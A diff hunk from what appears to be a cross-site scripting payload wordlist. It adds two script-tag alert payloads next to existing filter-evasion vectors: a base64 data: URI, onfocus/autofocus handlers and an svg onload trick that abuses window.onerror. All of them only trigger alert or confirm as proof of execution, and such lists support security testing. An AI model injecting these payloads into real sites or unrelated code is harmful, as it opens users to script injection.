@@ -44,6 +44,9 @@ data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= /
 onfocus=onfocus=\u0061lert(1) autofocus
 autofocus onfocus=window.onerror=alert;throw/1/;//
 <svg/onload=window.onerror=alert;throw/1/;>
+<script> $=1, alert($) </script>
+<script> (alert) (1) </script>
+
 
                                                        
  
